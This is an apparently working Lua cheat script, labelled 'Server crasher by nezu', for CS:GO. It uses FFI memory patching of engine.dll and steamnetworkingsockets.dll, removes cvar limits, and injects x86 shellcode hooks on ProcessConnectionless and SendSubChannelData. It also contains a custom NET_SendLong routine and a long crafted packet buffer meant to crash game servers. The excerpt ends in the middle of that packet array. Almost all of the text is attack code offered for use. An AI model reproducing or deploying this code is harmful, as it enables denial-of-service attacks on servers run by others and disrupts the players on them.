-- Server crasher by nezu
local bit = require("bit")
local ffi = require("ffi")
ffi.cdef[[
// Redefinitions for WinAPI conventions
typedef void VOID;
typedef VOID* LPVOID;
typedef uintptr_t ULONG_PTR;
typedef ULONG_PTR SIZE_T;
typedef unsigned long DWORD;
typedef unsigned long* PDWORD;
typedef int BOOL;
typedef unsigned char BYTE;
// Flags for functions below
enum{
	MEM_COMMIT = 0x1000,
	MEM_RESERVE = 0x2000
};
enum{
	PAGE_READWRITE = 0x04,
	PAGE_EXECUTE_READWRITE = 0x40
};
enum{
	MEM_RELEASE = 0x8000
};
// Function headers
LPVOID __stdcall VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);
BOOL __stdcall VirtualFree(LPVOID, SIZE_T, DWORD);
BOOL VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
DWORD CreateThread(DWORD lpThreadAttributes, DWORD dwStackSize, LPVOID lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, DWORD lpThreadId);
uintptr_t _beginthreadex(LPVOID security, DWORD stack_size, LPVOID start_address, LPVOID arglist, DWORD initflag, PDWORD thrdaddr);
void* __stdcall ShellExecuteA(void* hwnd, const char* op, const char* file, const char* params, const char* dir, int show_cmd);
// CS:GO classes
typedef struct _nezu_ConVar {
  void** virtual_function_table;
  BYTE pad[20];
  void* changeCallback;
  void* parent;
  const char* defaultValue;
  char* string;
  int							m_StringLength;
  float						m_fValue;
  int							m_nValue;
  int						  m_bHasMin;
  float						m_fMinVal;
  int						  m_bHasMax;
  float						m_fMaxVal;
  
  void* onChangeCallbacks_memory;
  int onChangeCallbacks_allocationCount;
  int onChangeCallbacks_growSize;
  int onChangeCallbacks_size;
  void* onChangeCallbacks_elements;
} nezu_ConVar;
]]


local C = ffi.C
local shell32 = ffi.load('Shell32')
local kernel32 = ffi.load("kernel32")
-- NL blocks kernel32.CreateThread?, no problem, will use vc runtime _beginthreadex ;)
-- most people should have this already, if not the lua fill not load
-- ffi.load("VCRUNTIME140")
local ucrtbase = ffi.load("ucrtbase")

local function debug(...)
  -- print(...)
end

debug("Server crasher starting...")

--#region helpers

local function patch(pointer, bytes)
  debug(string.format("patched %d bytes at %x", #bytes, tonumber(ffi.cast("uintptr_t", pointer))))
  local oldprotect = ffi.new('DWORD[1]')
---@diagnostic disable-next-line: undefined-field
  kernel32.VirtualProtect(pointer, #bytes, C.PAGE_EXECUTE_READWRITE, oldprotect)
  ffi.copy(pointer, ffi.new("char[?]", #bytes, bytes), #bytes)
---@diagnostic disable-next-line: undefined-field
  kernel32.VirtualProtect(pointer, #bytes, oldprotect[0], oldprotect)
end

local function instantPatch(dll, pattern, bytes)
  local mem = Utils.PatternScan(dll, pattern)
  if mem ~= nil then
    patch(ffi.cast("void*", mem), bytes)
    debug("patched "..dll..":\""..pattern.."\" at: 0x"..string.format("%x", tonumber(ffi.cast("uintptr_t", mem))))
  else
    debug("failed to patch "..dll..":\""..pattern.."\"")
  end
end

local function setUint(array, offset, value)
  local value2 = tonumber(ffi.cast("uintptr_t", value))
  for i = 0, 3 do
    array[i+offset] = bit.band(bit.rshift(value2, i * 8), 0xFF)
  end
end

local function createShellcode(array)
---@diagnostic disable-next-line: undefined-field
  local mem = kernel32.VirtualAlloc(nil, #array, C.MEM_COMMIT + C.MEM_RESERVE, C.PAGE_EXECUTE_READWRITE)
  ffi.copy(mem, ffi.new("char[?]", #array, array), #array)
  return mem
end

local function offsetPointer(mem, offset)
	return ffi.cast("void*", ffi.cast("uintptr_t", mem) + (offset * 4))
end

local function swapPointer(pointer, value)
	local oldprotect = ffi.new('DWORD[1]')
	---@diagnostic disable-next-line: undefined-field
	kernel32.VirtualProtect(pointer, 4, C.PAGE_EXECUTE_READWRITE, oldprotect)
	ffi.cast("uintptr_t*", pointer)[0] = ffi.cast("uintptr_t", value)
	---@diagnostic disable-next-line: undefined-field
	kernel32.VirtualProtect(pointer, 4, oldprotect[0], oldprotect)
end

-- no point in reinventing the wheel
local bitbuf = { base_address = nil, offset = 0 }
function bitbuf.setoffset(v) bitbuf.offset = v return bitbuf.offset end
function bitbuf.skip(i) bitbuf.offset = bitbuf.offset + i return bitbuf.offset end
function bitbuf.new(pv) bitbuf.base_address = ffi.cast('uintptr_t', pv) return bitbuf.base_address end
function bitbuf.read_byte() local v = tonumber( ffi.cast( 'char*', bitbuf.base_address + bitbuf.offset )[0] ) bitbuf.skip(1) return v end
function bitbuf.read_bool() local v = tonumber( ffi.cast( 'char*', bitbuf.base_address + bitbuf.offset )[0] ) bitbuf.skip(1) return v == 1 end
function bitbuf.read_string() local v, len len = tonumber( ffi.cast( 'char*', bitbuf.base_address + bitbuf.offset )[0] ) bitbuf.skip(1) v = ffi.string( ffi.cast('char*', bitbuf.base_address + bitbuf.offset), len ) bitbuf.skip(len + 1) return v end

--#endregion

--#region cvars

local engine_cvar = ffi.cast("void*** ", Utils.CreateInterface("vstdlib.dll", "VEngineCvar007")) or error('VEngineCvar007 is nil.')
local engine_cvar_vmt = engine_cvar[0]
local engine_cvar_findVar = ffi.cast(ffi.typeof("nezu_ConVar*(__thiscall*)(void*, const char*)"), engine_cvar_vmt[15])

local cvar_sv_maxroutable =                     engine_cvar_findVar(engine_cvar, "sv_maxroutable") or error('sv_maxroutable not found')
local cvar_net_maxroutable =                    engine_cvar_findVar(engine_cvar, "net_maxroutable") or error('net_maxroutable not found')
local cvar_cl_flushentitypacket =               engine_cvar_findVar(engine_cvar, "cl_flushentitypacket") or error('cl_flushentitypacket not found')
local cvar_net_compresspackets_minsize =        engine_cvar_findVar(engine_cvar, "net_compresspackets_minsize") or error('net_compresspackets_minsize not found')
local cvar_net_compresspackets =                engine_cvar_findVar(engine_cvar, "net_compresspackets") or error('net_compresspackets not found')
local cvar_net_threaded_socket_recovery_time =  engine_cvar_findVar(engine_cvar, "net_threaded_socket_recovery_time") or error('net_threaded_socket_recovery_time not found')
local cvar_net_threaded_socket_recovery_rate =  engine_cvar_findVar(engine_cvar, "net_threaded_socket_recovery_rate") or error('net_threaded_socket_recovery_rate not found')
local cvar_net_threaded_socket_burst_cap =      engine_cvar_findVar(engine_cvar, "net_threaded_socket_burst_cap") or error('net_threaded_socket_burst_cap not found')
local cvar_rate =                               engine_cvar_findVar(engine_cvar, "rate") or error('rate not found')

local cvar_vmt = cvar_rate.virtual_function_table

local cvar_setFloat = ffi.cast(ffi.typeof("void(__thiscall*)(void*, float)"), cvar_vmt[15])
local cvar_setInt =   ffi.cast(ffi.typeof("void(__thiscall*)(void*, int)"), cvar_vmt[16])

-- remove callbacks
cvar_sv_maxroutable.onChangeCallbacks_size = 0
cvar_net_maxroutable.onChangeCallbacks_size = 0
cvar_cl_flushentitypacket.onChangeCallbacks_size = 0
cvar_net_compresspackets_minsize.onChangeCallbacks_size = 0
cvar_net_compresspackets.onChangeCallbacks_size = 0
cvar_net_threaded_socket_recovery_time.onChangeCallbacks_size = 0
cvar_net_threaded_socket_recovery_rate.onChangeCallbacks_size = 0
cvar_net_threaded_socket_burst_cap.onChangeCallbacks_size = 0
cvar_rate.onChangeCallbacks_size = 0

-- remove limits
cvar_net_maxroutable.m_bHasMin = 0;
cvar_net_maxroutable.m_bHasMax = 0;

--#endregion

--#region state

local CRASHER_STATE_ENABLED =       0;
local CRASHER_STATE_STRENGTH =      1;
local CRASHER_STATE_OPC =           2;
local CRASHER_STATE_OSSCD =         3;
local CRASHER_STATE_SHOULD_CALL =   4;
local CRASHER_STATE_COUNTER =       5;
local CRASHER_STATE_NETCHAN =       6;
local CRASHER_STATE_SENDLONG =      7;
local CRASHER_STATE_SENDTOIMPL =    8;
local CRASHER_STATE_BEGINTHREADEX = 9;
local CRASHER_STATE_DUM_ORIG =      10;
local CRASHER_STATE_DUM_CALLBACK =  11;

---@diagnostic disable-next-line: undefined-field
local crasher_state_mem = kernel32.VirtualAlloc(nil, 0x1000, C.MEM_COMMIT + C.MEM_RESERVE, C.PAGE_READWRITE)
local crasher_state = ffi.cast("uintptr_t*", crasher_state_mem);

crasher_state[CRASHER_STATE_ENABLED] = 0
crasher_state[CRASHER_STATE_STRENGTH] = 500

--#endregion

--#region patches
instantPatch("engine.dll", "B8 ? ? ? ? 3B F0 0F 4F F0 89 5D FC", { 0xB8, 0x96, 0x00, 0x00, 0x00 })
instantPatch("engine.dll", "B8 ? ? ? ? EB 05 3B C6", { 0xB8, 0x24, 0x00, 0x00, 0x00 })
instantPatch("steamnetworkingsockets.dll", "8D 0C 16 3B", { 0x8D, 0x0C, 0x16, 0x90, 0x90, 0xEB })
--#endregion

--#region crasher hooks

instantPatch("engine.dll", "68 ? ? ? ? C3 81 EC ? ? ? ? 56 57 8B F9 8B 4D 08", { 0x55, 0x8B, 0xEC, 0x83, 0xE4, 0xF0 })
local ProcessConnectionless = Utils.PatternScan("engine.dll", "55 8B EC 83 E4 F0 81 EC ? ? ? ? 56 57 8B F9 8B 4D 08")

crasher_state[CRASHER_STATE_OPC] = ffi.cast("uintptr_t", ProcessConnectionless) + 6

if ProcessConnectionless ~= nil then

  local Hooked_ProcessConnectionless = {
    0x55,                                     -- push ebp
    0x8B, 0xEC,                               -- mov ebp, esp
    0x80, 0x3D, 0xDE, 0xAD, 0xBE, 0xEF, 0x00, -- cmp [0xDEADBEEF], 0
    0x74, 0x06,                               -- jz call_orig
    0xB0, 0x01,                               -- mov al, 1
    0x5D,                                     -- pop ebp
    0xC2, 0x04, 0x00,                         -- retn 4
    -- :call_orig
    0x5D,                                     -- pop ebp
    -- overwritten bytes from original:
    0x55,                                     -- push ebp
    0x8B, 0xEC,                               -- mov ebp, esp
    0x83, 0xE4, 0xF0,                         -- and esp, 0FFFFFFF0h
    -- return flow to original
    0xFF, 0x25, 0xEF, 0xBE, 0xAD, 0xDE        -- jmp 0xDEADBEEF
  }

  local pProcessConnectionless = ffi.cast("void*", ProcessConnectionless)

  setUint(Hooked_ProcessConnectionless, 6, offsetPointer(crasher_state, CRASHER_STATE_ENABLED))
  setUint(Hooked_ProcessConnectionless, 28, offsetPointer(crasher_state, CRASHER_STATE_OPC))

  local mem_Hooked_ProcessConnectionless = createShellcode(Hooked_ProcessConnectionless)

  local ProcessConnectionless_hook = {
    0x68, 0x78, 0x56, 0x34, 0x12, -- push 0x12345678
    0xC3                          -- ret
  }

  setUint(ProcessConnectionless_hook, 2, mem_Hooked_ProcessConnectionless)

	debug("mem_Hooked_ProcessConnectionless", mem_Hooked_ProcessConnectionless)

  patch(pProcessConnectionless, ProcessConnectionless_hook)

  debug("hooked ProcessConnectionless")
else
	print("Failed to hook ProcessConnectionless")
end

local csp = Utils.PatternScan("engine.dll", "A1 ? ? ? ? 33 D2 6A 00 6A 00 33 C9 89 B0");
local clientstate = ffi.cast('uintptr_t**', tonumber(ffi.cast('uintptr_t', csp)) + 1)[0][0];

instantPatch("engine.dll", "68 ? ? ? ? C3 53 8B D9 89 5D F4 E8", { 0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x18 })
local SendSubChannelData = Utils.PatternScan("engine.dll", "55 8B EC 83 EC 18 53 8B D9 89 5D F4 E8")

crasher_state[CRASHER_STATE_OSSCD] = ffi.cast("uintptr_t", SendSubChannelData) + 6

if SendSubChannelData ~= nil then

  local Hooked_SendSubChannelData = {
    0x55,                                                       --  0 push ebp
    0x8B, 0xEC,                                                 --  1 mov ebp, esp
    0xB8, 0x78, 0x56, 0x34, 0x12,                               --  3 mox eax, clientstate
    0xC6, 0x80, 0x78, 0x01, 0x00, 0x00, 0x00,                   --  8 mov [eax+0x178], 0
    0xC7, 0x81, 0x5C, 0x41, 0x00, 0x00, 0x00, 0x00, 0x80, 0xBF, -- 15 mov [ecx+0x415c], 0xbf800000 ; -1.0f
    0x5D,                                                       -- 25 pop ebp
    -- overwritten bytes from original:
    0x55,                                                       -- 26 push ebp
    0x8B, 0xEC,                                                 -- 27 mov ebp, esp
    0x83, 0xEC, 0x18,                                           -- 29 sub esp, 18h
    -- return flow to original
    0xFF, 0x25, 0xEF, 0xBE, 0xAD, 0xDE                          -- 32 jmp oSendSubChannelData
  }

  local pSendSubChannelData = ffi.cast("void*", SendSubChannelData)

  setUint(Hooked_SendSubChannelData, 5, clientstate)
  setUint(Hooked_SendSubChannelData, 35, offsetPointer(crasher_state, CRASHER_STATE_OSSCD))

  local mem_Hooked_SendSubChannelData = createShellcode(Hooked_SendSubChannelData)

  local SendSubChannelData_hook = {
    0x68, 0x78, 0x56, 0x34, 0x12, -- push 0x12345678
    0xC3                          -- ret
  }

  setUint(SendSubChannelData_hook, 2, mem_Hooked_SendSubChannelData)

	debug("mem_Hooked_SendSubChannelData", mem_Hooked_SendSubChannelData)

  patch(pSendSubChannelData, SendSubChannelData_hook)

  debug("hooked SendSubChannelData")
else
	print("Failed to hook SendSubChannelData")
end

-- to lazy to comment this one, it's copied from disassembly
local CUSTOM_NET_SendLong = {
  0x55, 0x8B, 0xEC, 0x81, 0xEC, 0x04, 0x05, 0x00, 0x00, 0x53,
  0x8B, 0x5D, 0x0C, 0xB8, 0x40, 0x02, 0x00, 0x00, 0x56, 0x66,
  0x89, 0x85, 0x06, 0xFB, 0xFF, 0xFF, 0xB8, 0x1F, 0x6B, 0x19,
  0x3A, 0x57, 0x8B, 0xFA, 0x89, 0x4D, 0xF4, 0x8D, 0xB3, 0x33,
  0x02, 0x00, 0x00, 0x89, 0x7D, 0xEC, 0xF7, 0xEE, 0xC7, 0x85,
  0xFC, 0xFA, 0xFF, 0xFF, 0xFE, 0xFF, 0xFF, 0xFF, 0xC1, 0xFA,
  0x07, 0x8B, 0xF2, 0xC1, 0xEE, 0x1F, 0x03, 0xF2, 0x81, 0xFE,
  0xA1, 0x03, 0x00, 0x00, 0x0F, 0x86, 0xFF, 0x00, 0x00, 0x00,
  0xBE, 0xA1, 0x03, 0x00, 0x00, 0xB8, 0x7F, 0x00, 0x00, 0x00,
  0x3B, 0xF0, 0x0F, 0x47, 0xF0, 0x89, 0x75, 0xFC, 0xFF, 0x87,
  0x90, 0x41, 0x00, 0x00, 0x33, 0xC9, 0x81, 0x8D, 0x04, 0xFB,
  0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x33, 0xD2, 0x8B, 0x87,
  0x90, 0x41, 0x00, 0x00, 0x89, 0x4D, 0xF8, 0x89, 0x55, 0x0C,
  0x89, 0x85, 0x00, 0xFB, 0xFF, 0xFF, 0x85, 0xDB, 0x0F, 0x8E,
  0xB4, 0x00, 0x00, 0x00, 0x8B, 0x7D, 0x08, 0x8D, 0x85, 0x08,
  0xFB, 0xFF, 0xFF, 0x2B, 0xF8, 0xB8, 0x34, 0x02, 0x00, 0x00,
  0x81, 0xFB, 0x34, 0x02, 0x00, 0x00, 0x8B, 0xF3, 0x0F, 0x47,
  0xF0, 0x81, 0xF9, 0xA1, 0x03, 0x00, 0x00, 0x0F, 0x83, 0x8D,
  0x00, 0x00, 0x00, 0x8B, 0xC1, 0xC1, 0xE0, 0x08, 0x03, 0x45,
  0xFC, 0x66, 0x89, 0x85, 0x04, 0xFB, 0xFF, 0xFF, 0x33, 0xC0,
  0x85, 0xF6, 0x74, 0x16, 0x0F, 0x1F, 0x40, 0x00, 0x8D, 0x95,
  0x08, 0xFB, 0xFF, 0xFF, 0x03, 0xD0, 0x40, 0x8A, 0x0C, 0x17,
  0x88, 0x0A, 0x3B, 0xC6, 0x72, 0xEE, 0x8D, 0x46, 0x0C, 0xC7,
  0x45, 0x08, 0x00, 0x00, 0x00, 0x00, 0x89, 0x45, 0xF0, 0x8B,
  0x45, 0xF4, 0x89, 0x45, 0xE8, 0x8B, 0x45, 0xF0, 0x6A, 0xFF,
  0x50, 0x8D, 0x95, 0xFC, 0xFA, 0xFF, 0xFF, 0x8B, 0x4D, 0xEC,
  0xFF, 0x55, 0xE8, 0x83, 0xC4, 0x08, 0x89, 0x45, 0x08, 0x8B,
  0x45, 0x08, 0x85, 0xC0, 0x78, 0x32, 0x8B, 0x55, 0x0C, 0x3B,
  0xC6, 0x7C, 0x05, 0x03, 0xD6, 0x89, 0x55, 0x0C, 0x8B, 0x4D,
  0xF8, 0x2B, 0xDE, 0x41, 0x81, 0xC7, 0x34, 0x02, 0x00, 0x00,
  0x89, 0x4D, 0xF8, 0x81, 0xF9, 0x80, 0x00, 0x00, 0x00, 0x7F,
  0x2D, 0xB8, 0x34, 0x02, 0x00, 0x00, 0x85, 0xDB, 0x0F, 0x8F,
  0x5C, 0xFF, 0xFF, 0xFF, 0x8B, 0xC2, 0x5F, 0x5E, 0x5B, 0x8B,
  0xE5, 0x5D, 0xC2, 0x0C, 0x00, 0x83, 0xFE, 0x01, 0x0F, 0x83,
  0xFD, 0xFE, 0xFF, 0xFF, 0xC7, 0x45, 0xFC, 0x01, 0x00, 0x00,
  0x00, 0xE9, 0xFE, 0xFE, 0xFF, 0xFF, 0x5F, 0x5E, 0x8D, 0x04,
  0x1A, 0x5B, 0x8B, 0xE5, 0x5D, 0xC2, 0x0C, 0x00
}

local mem_CUSTOM_NET_SendLong = createShellcode(CUSTOM_NET_SendLong)

local packetbuf = {
	0xcd,0xcd,0xcd,0xcd,0xcd,0xcd,0xcd,0xcd,0xcd,0xcd,0xcd,0xcd,0xff,0xff,0xff,0xff,
	0x6b,0x40,0xf2,0x0b,0x19,0x31,0x00,0x00,0x5a,0xcd,0x00,0x02,0x29,0x00,0x43,0x00,
	0x02,0x23,0x00,0x76,0xbe,0x55,0x00,0x76,0x84,0x00,0x76,0xe1,0x00,0x76,0x6c,0x00,
	0x76,0xd6,0x55,0x00,0x76,0xae,0x00,0x76,0x52,0x00,0x76,0x90,0x00,0x76,0x49,0x55,
	0x00,0x76,0xf1,0x00,0x7e,0xbb,0x00,0x76,0xe9,0x00,0x76,0xeb,0x55,0x00,0x76,0xb3,
	0x00,0x76,0xa6,0x00,0x76,0xdb,0x00,0x76,0x3c,0x55,0x00,0x76,0x87,0x00,0x76,0x0c,
	0x00,0x76,0x3e,0x00,0x76,0x99,0x55,0x00,0x76,0x24,0x00,0x76,0x5e,0x00,0x76,0x0d,
	0x00,0x76,0x1c,0x55,0x00,0x76,0x06,0x00,0x76,0xb7,0x00,0x76,0x47,0x00,0x76,0xde,
	0x55,0x07,0xfe,0x12,0x00,0x76,0x4d,0x00,0x76,0xc8,0x00,0x76,0x43,0x55,0x0b,0xfe,
	0x8b,0x0a,0xfe,0x1f,0x00,0x76,0x03,0x00,0x76,0x5a,0x55,0x00,0x76,0x7d,0x00,0x76,
	0x09,0x00,0x76,0x38,0x00,0x76,0x25,0x55,0x03,0x7e,0x5d,0x00,0x76,0xd4,0x00,0x76,
	0xcb,0x00,0x76,0xfc,0x55,0x00,0x76,0x96,0x00,0x76,0xf5,0x00,0x76,0x45,0x00,0x76,
	0x3b,0xd5,0x00,0x76,0x13,0x0f,0x7e,0x89,0x00,0x76,0x0a,0x10,0x7e,0x15,0x77,0x55,
	0x1b,0x77,0x32,0x00,0x76,0x20,0x00,0x76,0x9a,0x00,0x76,0x50,0x55,0x00,0x76,0xee,
	0x00,0x76,0x40,0x00,0x76,0x78,0x00,0x76,0x36,0x5d,0x00,0x76,0xfd,0x13,0x7e,0x1f,
	0x77,0x05,0x77,0xf6,0x00,0x76,0x9e,0xab,0x10,0xfe,0x02,0x77,0xdc,0x00,0x76,0xad,
	0x00,0x76,0x4f,0x00,0x76,0xaa,0x14,0x00,0x76,0xf2,0x00,0x76,0x44,0x08,0x7e,0x66,
	0x00,0x76,0xaa,0xd0,0x00,0x76,0x6b,0x00,0x76,0xc4,0x00,0x76,0x30,0x1e,0xfe,0x6b,
	0x08,0xf7,0x12,0xf7,0xa1,0x00,0x76,0x22,0x0a,0x7e,0x00,0xf7,0x91,0x5d,0x00,0x76,
	0x9d,0x2f,0xfe,0x1f,0x77,0x1b,0x77,0xda,0x00,0x76,0xb0,0x55,0x00,0x76,0xca,0x29,
	0x7e,0x02,0x00,0x76,0xb9,0x00,0x76,0x72,0xab,0x05,0x7e,0x10,0x77,0x2c,0x00,0x76,
	0x80,0x00,0x76,0x7e,0x00,0x76,0x5a,0xc5,0x04,0xfe,0xd5,0x33,0xfe,0x02,0xf7,0xb2,
	0x00,0x76,0xea,0x55,0x00,0x76,0xc9,0x00,0x76,0xcc,0x00,0x76,0x53,0x00,0x76,0xbf,
	0x7d,0x00,0x76,0x67,0x3c,0x7e,0x01,0x77,0x17,0x77,0x01,0x77,0x08,0x77,0x2d,0x55,
	0x1a,0xfe,0x8e,0x18,0x7e,0x83,0x00,0x76,0xef,0x00,0x76,0x57,0x55,0x0d,0xfe,0x61,
	0x00,0x76,0xff,0x00,0x76,0x69,0x00,0x76,0x8f,0xab,0x01,0xfe,0x00,0x07,0xd1,0x00,
	0x76,0x1e,0x12,0xfe,0x9c,0x00,0x76,0x56,0x16,0x14,0xfe,0x00,0x77,0xe6,0x00,0x76,
	0x1d,0x00,0x76,0xf0,0xab,0x4c,0x7e,0x25,0xf7,0x4a,0x00,0x76,0x77,0x1a,0x7e,0xd7,
	0x00,0x76,0xfa,0xe8,0x00,0x76,0x39,0x19,0xfe,0x14,0x77,0x39,0xf7,0x16,0x77,0x2f,
	0xf7,0xb5,0x0a,0xf7,0x33,0x00,0x76,0x74,0x2f,0xfe,0x4b,0xf7,0xf4,0x1c,0xfe,0x55,
	0x3f,0x77,0x9f,0x00,0xfe,0xa4,0x00,0x76,0x59,0x18,0xfe,0x35,0x7d,0x00,0x76,0xcf,
	0x2d,0xfe,0x2b,0xf7,0x05,0xf7,0x1f,0xf7,0x02,0x77,0xd3,0x5b,0x5a,0x7e,0x1d,0x77,
	0x48,0x01,0xfe,0x19,0x77,0x75,0x15,0x7e,0xd9,0x55,0x15,0xfe,0x2a,0x00,0x76,0xe5,
	0x00,0x76,0xc0,0x00,0x76,0xf7,0xb5,0x00,0x76,0x2b,0x43,0x7e,0x81,0x5c,0xfe,0x3d,
	0x77,0x0e,0x00,0x76,0x5a,0x5f,0x47,0xfe,0x00,0x10,0xfe,0x22,0x77,0x8d,0x6a,0x7e,
	0x7b,0xd5,0x00,0x76,0x05,0x00,0x76,0x15,0x00,0x76,0x07,0x3f,0x7e,0x19,0x77,0xaa,
	0x82,0x3c,0x7e,0x18,0x00,0x76,0x70,0x00,0x76,0x92,0x3d,0xfe,0xaa,0x64,0x00,0x76,
	0x54,0x00,0x76,0xce,0x00,0x76,0xb1,0x00,0x76,0xae,0x85,0x69,0x7e,0x2d,0xf7,0x08,
	0x77,0xf8,0x00,0x76,0x46,0x00,0x76,0xea,0x6a,0x00,0x76,0x04,0x5d,0xfe,0x73,0x10,
	0xfe,0x16,0xf7,0x2e,0xf7,0xfa,0x2f,0x3b,0xfe,0x68,0x11,0xfe,0x17,0x77,0x2d,0xf7,
	0x00,0x77,0x52,0x77,0x6b,0x39,0x77,0x03,0x77,0x76,0x00,0x76,0xfa,0x06,0x7e,0x6e,
	0x77,0x11,0x57,0x59,0xfe,0x63,0x77,0x76,0xf7,0x88,0x00,0x76,0x79,0x00,0x76,0xfe,
	0xff,0x80,0xfe,0x66,0xf7,0x6e,0xf7,0x74,0x77,0x22,0xf7,0x7d,0xf7,0x2a,0xf7,0x6d,
	0x77,0xd5,0x28,0x77,0xd8,0x00,0x76,0x28,0x17,0x7e,0x0b,0x70,0xfe,0x52,0x77,0xaa,
	0x60,0x32,0xfe,0x3d,0x00,0x76,0x97,0x00,0x76,0x27,0x00,0x76,0xde,0x8a,0x02,0x7e,
	0x10,0x77,0x30,0xf7,0x12,0xf7,0xc2,0x3e,0x7e,0x00,0x07,0xdf,0x17,0x7f,0x4e,0x77,
	0x1d,0x77,0x10,0xf7,0x0f,0x77,0x08,0x2b,0xfe,0x6c,0x77,0x6f,0x56,0xf7,0x24,0x77,
	0x2a,0x77,0x04,0x77,0xa5,0x18,0x7e,0x10,0x77,0xc1,0xf5,0x00,0x76,0x8c,0x5a,0xfe,
	0xa9,0x11,0xfe,0x36,0x77,0x0f,0xf7,0x02,0xf7,0x5f,0x24,0x77,0x99,0x77,0x2a,0x77,
	0x3d,0x77,0x80,0x77,0x95,0x06,0xfe,0x9b,0xaf,0x70,0xfe,0x3e,0xf7,0x49,0x77,0x69,
	0x77,0xa8,0x04,0x7e,0xa7,0x00,0x76,0xba,0x86,0x15,0x7e,0xb5,0x35,0x7e,0x68,0x77,
	0x03,0x77,0xe7,0x30,0x7e,0xfb,0xa9,0xf7,0x61,0xf7,0x55,0x4c,0xfe,0x95,0xf7,0x12,
	0x77,0x02,0x77,0x03,0xf7,0xef,0xab,0xf7,0x7f,0xf7,0x6b,0xf7,0xa3,0x77,0x4e,0x0d,
	0xfe,0x84,0x77,0x67,0x77,0xeb,0x2d,0xf7,0x04,0xf7,0x71,0x5b,0x7e,0xe2,0x1b,0x7e,
	0x00,0xf7,0x5f,0x77,0xf5,0x13,0xf7,0xb4,0xa8,0x7e,0x65,0x0b,0xfe,0x55,0x77,0x42,
	0xf7,0x9c,0xf7,0x77,0x1d,0xf7,0x4b,0xf7,0x26,0x77,0x7a,0x2c,0x7e,0x56,0xf7,0x16,
	0x77,0x63,0xb5,0x26,0x7e,0x26,0x00,0x76,0xdf,0x4e,0x7e,0xc0,0x77,0x6d,0x4c,0xfe,
	0xda,0x62,0x00,0x76,0xe0,0x4a,0xfe,0x6f,0x77,0x34,0x1b,0xfe,0x73,0x77,0x7d,0xb1,
	0xf7,0x3f,0x0c,0x7e,0x16,0xf7,0x27,0xf7,0x06,0xf7,0x4f,0x77,0xe3,0xff,0x1a,0xfe,
	0x1c,0xf7,0x1b,0x77,0x76,0x77,0xab,0x77,0x2b,0x77,0x79,0x77,0x0f,0x77,0xdb,0xb8,
	0xf7,0x07,0xf7,0x41,0x61,0x7e,0x81,0x77,0x0f,0x38,0xfe,0x64,0x77,0xfd,0x19,0x77,
	0x1b,0x08,0x7e,0x3c,0x77,0x41,0x77,0x47,0xf7,0x2a,0xf7,0x82,0xf7,0xdf,0x92,0x77,
	0x1c,0x77,0xb3,0x77,0x40,0xf7,0x94,0xf7,0xf3,0x33,0x7e,0x6d,0xf7,0xbf,0x26,0xf7,
	0x6e,0x77,0xb0,0xf7,0xd3,0x77,0x27,0xf7,0x95,0x77,0xa0,0x4b,0xfe,0xff,0x44,0xf7,
	0x7c,0x77,0xd0,0x77,0x40,0x77,0x3b,0x77,0x42,0x77,0x23,0x77,0x68,0x77,0xff,0xd0,
	0x77,0x04,0xf7,0x08,0x77,0x27,0xf7,0x00,0xf7,0x5e,0x77,0x17,0x77,0x0e,0xf7,0xdf,
	0x16,0xf7,0x80,0x77,0x07,0x77,0x66,0xf7,0x35,0xf7,0x7f,0x77,0xfe,0x9b,0x77,0x5f,
	0x43,0x77,0x41,0xf7,0x43,0xf7,0x8e,0xf7,0x49,0xf7,0xaa,0x00,0x76,0x5b,0xff,0x59,
	0xfe,0xd1,0x77,0x50,0xf7,0x8c,0x77,0xd5,0x77,0x63,0xf7,0xbb,0x77,0x0c,0xf7,0x7f,
	0xca,0x77,0x3d,0x77,0x2b,0x77,0x63,0x77,0x0d,0x77,0x21,0x77,0xd0,0x77,0xb8,0xff,
	0xa6,0x7e,0x08,0x77,0xc5,0xf7,0xaa,0x77,0x8a,0xf7,0x26,0xf7,0xbd,0xf7,0x00,0x07,
	0xef,0x6f,0xf7,0xdc,0xf7,0x10,0xf7,0x92,0xf7,0x3a,0x44,0x7e,0x36,0x77,0x4c,0xf7,
	0x5f,0xaa,0x77,0x8e,0xf7,0x0f,0xf7,0x31,0xf7,0x34,0x77,0x10,0x38,0xfe,0x4c,0xfd,
	0x00,0x76,0xec,0x33,0xfe,0x01,0x77,0x21,0x77,0x14,0x77,0x32,0x77,0x08,0x77,0xfe,
	0x31,0x3c,0x7e,0x19,0x77,0x83,0xf7,0xa8,0x77,0xaf,0x77,0xd3,0x7f,0x79,0xf7,0xff,
	0x2c,0xf7,0x7f,0xf7,0xbf,0xf7,0x12,0xf7,0x29,0x77,0x83,0x77,0x50,0x77,0x03,0xf7,
	0xf5,0x7d,0x77,0x42,0x00,0x76,0x7c,0x5c,0x7e,0x6c,0xf7,0x99,0x77,0x00,0x07,0xff,
	0x29,0xf7,0x30,0xf7,0x45,0xf7,0x67,0x77,0xa0,0x77,0x1e,0x77,0x17,0x77,0x02,0xf7,
	0xf7,0x28,0xf7,0x12,0xf7,0x0d,0xf7,0x5a,0x3d,0x7e,0x66,0x77,0x86,0xf7,0x1f,0xf7,
	0xef,0x43,0xf7,0x8b,0x77,0x5a,0xf7,0x8d,0x77,0xde,0x01,0x7e,0xdf,0xf7,0x15,0xf7,
	0xff,0x45,0x77,0x29,0xf7,0x78,0xf7,0xa2,0xf7,0x01,0x77,0x69,0xf7,0x18,0x77,0x2e,
	0x77,0xfe,0xe4,0xb0,0xfe,0x01,0x77,0x81,0xf7,0x14,0xf7,0xb9,0x77,0x64,0x77,0x4a,
	0x77,0xab,0x0f,0x77,0x77,0x77,0x21,0xae,0x7e,0x93,0x87,0xfe,0xb3,0xc6,0xfe,0xdf,
	0x25,0xf7,0x2b,0xf7,0x92,0x77,0xa3,0x77,0x37,0xf7,0xaf,0x4b,0xfe,0x23,0xf7,0xfe,
	0x6f,0x0d,0x7e,0xcf,0x7f,0x2f,0x77,0x1a,0x77,0xa4,0xf7,0x19,0xf7,0x3f,0xf7,0xff,
	0x5f,0x77,0x24,0xf7,0x78,0xf7,0x3c,0x77,0x63,0xf7,0x17,0x77,0x05,0x77,0x03,0xff,
	0x7f,0x21,0xf7,0x31,0xf7,0x62,0xf7,0x93,0x77,0xc2,0x77,0x4c,0xf7,0x74,0x77,0x09,
